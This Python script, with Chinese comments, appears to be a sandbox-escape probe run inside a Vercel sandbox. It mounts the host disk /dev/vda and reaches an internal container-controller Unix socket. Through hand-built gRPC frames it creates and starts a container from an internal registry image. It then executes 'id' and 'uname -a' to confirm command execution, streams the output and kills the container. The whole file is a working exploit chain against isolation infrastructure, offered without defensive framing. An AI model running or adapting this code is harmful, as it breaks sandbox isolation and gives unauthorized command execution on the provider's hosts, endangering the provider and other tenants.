# -*- coding: utf-8 -*-
"""vda22_grpc_probe: gRPC 协议探测 + 极速 Exec 链路
P1: gRPC 协议 (TE:trailers) 探测 Create/Start/Exec/Wait/StreamOutput
P2: 极速链路: Create -> Start -> 立即 Exec (gRPC) 拿 processId
P3: Process StreamOutput (gRPC) 拿命令输出
输出落盘 + 哨兵 V22I_DONE"""
import os, time, socket, ctypes, re, struct

OUT = '/vercel/sandbox/v22i.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_raw(sockpath, path, body, ctype, t=6, shutdown_wr=False, te=None):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        if isinstance(body, str):
            body = body.encode()
        hdr = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Content-Length: %d\r\nConnection: close\r\n' % (path, ctype, len(body)))
        if te:
            hdr += 'TE: %s\r\n' % te
        hdr += '\r\n'
        s.sendall(hdr.encode() + body)
        if shutdown_wr:
            try:
                s.shutdown(socket.SHUT_WR)
            except Exception:
                pass
        data = b''
        while True:
            try:
                chunk = s.recv(16384)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:1500].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def grpc_env(payload):
    """gRPC 帧: 1字节压缩标志 + 4字节 BE 长度 + payload"""
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pstr(field_no, s):
    b = s.encode()
    tag = (field_no << 3) | 2
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    l = len(b)
    while l > 127:
        out.append((l & 127) | 128)
        l >>= 7
    out.append(l)
    return bytes(out) + b


def pbool(field_no, v):
    tag = (field_no << 3) | 0
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    out.append(1 if v else 0)
    return bytes(out)


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    sp = '/mnt/vdax/run/cell/cell.sock'
    IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
    CSVC = '/vercel.hive.cell.api.containers.v1.ContainersService'
    PSVC = '/vercel.hive.cell.api.processes.v1.ProcessService'

    # P1: gRPC 协议探测
    log('=== P1 gRPC protocol probe ===')
    empty = grpc_env(b'')
    for tag, path, body, sh in [
        ('grpc Create empty', CSVC + '/Create', empty, True),
        ('grpc Exec empty', CSVC + '/Exec', empty, True),
        ('grpc Wait empty', CSVC + '/Wait', empty, True),
        ('grpc StreamOutput empty', CSVC + '/StreamOutput', empty, True),
        ('grpc Kill empty', CSVC + '/Kill', empty, True),
        ('grpc ProcStream empty', PSVC + '/StreamOutput', empty, True),
    ]:
        st, bd = rpc_raw(sp, path, body, 'application/grpc', t=4, shutdown_wr=sh, te='trailers')
        log('%-26s -> %s | %s' % (tag, st, bd[:300].replace('\n', ' ')))
        time.sleep(0.2)

    # P1b: grpc-web
    st, bd = rpc_raw(sp, CSVC + '/Exec', empty, 'application/grpc-web+proto', t=4, shutdown_wr=True)
    log('grpcweb Exec empty -> %s | %s' % (st, bd[:200].replace('\n', ' ')))

    # P2: 极速链路 Create -> Start -> Exec (gRPC proto)
    log('=== P2 fast chain gRPC ===')
    st, bd = rpc_raw(sp, CSVC + '/Create', '{"image":"%s","command":"/bin/sleep 300"}' % IMG,
                     'application/json', t=30)
    log('create -> %s | %s' % (st, bd[:200]))
    m = re.search(r'"containerId":\s*"([^"]+)"', bd)
    if not m:
        log('NO CID - abort chain')
        log('V22I_DONE')
        f.close()
        return
    cid = m.group(1)
    log('CID=%s' % cid)
    st, bd = rpc_raw(sp, CSVC + '/Start', '{"container_id":"%s"}' % cid, 'application/json', t=8)
    log('start -> %s | %s' % (st, bd[:150]))

    # 立即 Exec gRPC (无 sleep!)
    exec_payloads = [
        ('grpc f1,f2 id', pstr(1, cid) + pstr(2, 'id')),
        ('grpc f1,f2 shell', pstr(1, cid) + pstr(2, '/bin/sh -c id;uname -a')),
    ]
    pid = None
    for tag, payload in exec_payloads:
        st, bd = rpc_raw(sp, CSVC + '/Exec', grpc_env(payload), 'application/grpc', t=10, shutdown_wr=True, te='trailers')
        log('exec %-20s -> %s | %s' % (tag, st, bd[:400].replace('\n', ' ')))
        m = re.search(r'"(?:processId|process_id)":\s*"([^"]+)"', bd)
        if m:
            pid = m.group(1)
            log('PID=%s' % pid)
        time.sleep(0.2)

    # 备选: 立即 Exec json (无 shutdown)
    if not pid:
        st, bd = rpc_raw(sp, CSVC + '/Exec', '{"container_id":"%s","command":"id"}' % cid,
                         'application/json', t=8)
        log('exec json -> %s | %s' % (st, bd[:300].replace('\n', ' ')))
        m = re.search(r'"(?:processId|process_id)":\s*"([^"]+)"', bd)
        if m:
            pid = m.group(1)
            log('PID=%s' % pid)

    # P3: Process StreamOutput gRPC
    log('=== P3 Process StreamOutput ===')
    if pid:
        for tag, payload in [
            ('grpc stdout', pstr(1, pid) + pbool(2, True)),
            ('grpc noflag', pstr(1, pid)),
        ]:
            st, bd = rpc_raw(sp, PSVC + '/StreamOutput', grpc_env(payload), 'application/grpc', t=6, shutdown_wr=True, te='trailers')
            log('stream %s -> %s | %s' % (tag, st, bd[:500].replace('\n', ' ')))
            time.sleep(0.3)
    else:
        pid27 = 'hvcp_' + 'a' * 27
        payload = pstr(1, pid27) + pbool(2, True)
        st, bd = rpc_raw(sp, PSVC + '/StreamOutput', grpc_env(payload), 'application/grpc', t=5, shutdown_wr=True, te='trailers')
        log('stream fake -> %s | %s' % (st, bd[:300].replace('\n', ' ')))

    # P4: Kill
    st, bd = rpc_raw(sp, CSVC + '/Kill', '{"container_id":"%s"}' % cid, 'application/json', t=5)
    log('kill -> %s | %s' % (st, bd[:150]))

    log('V22I_DONE')
    f.close()


if __name__ == '__main__':
    main()
